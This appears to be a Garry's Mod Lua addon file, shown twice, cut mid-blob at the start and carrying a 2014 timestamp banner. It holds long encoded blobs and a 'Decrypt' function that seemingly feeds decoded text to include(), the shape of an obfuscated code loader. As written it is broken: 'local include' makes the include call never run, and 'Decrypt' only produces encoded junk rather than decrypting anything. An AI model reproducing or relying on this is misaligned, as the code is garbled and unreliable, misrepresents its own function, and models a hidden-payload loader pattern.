AAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:33:30          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil
